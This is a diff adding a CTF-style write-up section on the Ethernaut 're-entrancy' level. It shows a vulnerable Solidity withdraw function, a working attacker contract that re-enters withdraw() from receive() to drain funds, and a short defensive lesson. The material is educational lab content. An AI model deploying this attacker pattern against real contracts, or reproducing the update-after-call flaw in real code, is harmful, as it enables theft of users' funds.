@@ -667,3 +667,102 @@ Look always from the perspective of a Smart Contract. Can another smart contract
 break my contract, by not having some functions implemented? 
 And since December 2019 - use `call` instead of `transfer` or `send` to send
 Ether.
+
+## Level 10: Re-entrancy <a name="level-10-re-entrancy"></a>
+
+The one, the legendary, the whole grail of attacks - at least based on the history involved
+where this attack has been used.
+
+Let's have a look at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Reentrance {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) public balances;
+
+    function donate(address _to) public payable {
+        balances[_to] = balances[_to].add(msg.value);
+    }
+
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] >= _amount) {
+            (bool result,) = msg.sender.call{value: _amount}("");
+            if (result) {
+                _amount;
+            }
+            balances[msg.sender] -= _amount;
+        }
+    }
+
+    receive() external payable {}
+}
+```
+
+What does re-entrancy in context of smart contracts mean? It means that a contract calls another contract and the called contract calls back the calling contract before the first call is finished. This can lead to unexpected behavior and can be exploited to drain the funds of the calling contract.
+
+
+So, here is our attacker contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+abstract contract Reentrance {
+    function donate(address _to) virtual external payable;
+    function withdraw(uint256 _amount) virtual external;
+}
+
+contract Attacker {
+    
+    Reentrance public re;
+    uint public amount_sent;
+
+    constructor(address _contract) {
+        re = Reentrance(_contract);
+    }
+
+    function attack() external payable {
+        amount_sent = msg.value;
+        re.donate{value: amount_sent}(address(this));
+        re.withdraw(amount_sent);
+    }
+
+    receive() external payable {
+        uint balanceOfTarget = address(re).balance;
+        if (balanceOfTarget >= amount_sent) {
+            re.withdraw(amount_sent);
+        }
+        
+    }
+}
+```
+
+Once our attacker contract is deployed, we are going to call the `attack()` function,
+where we send some funds to it. Our contract is going to call the `donate()` function
+and forward our funds to the Reentrance contract.
+
+Our contract now holds some funds in the Reentrancy contract.
+
+Now to the attack: We call the `withdraw()` function of the Reentrancy contract. The
+Reentrancy contract is going to send the funds to our contract and therefore triggering
+our `receive()` function. During the execution of the `receive()` function, we call the
+`withdraw()` function of the Reentrancy contract again. Since the balance
+has not been updated yet, the Reentrancy contract is going to send the funds again
+to our contract. This can be repeated until the Reentrancy contract has no funds left.
+
+Nice, isn't it? :)
+
+### Learning
+Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.
+
+Re-entrancy is a common attack. You should always be prepared for it!
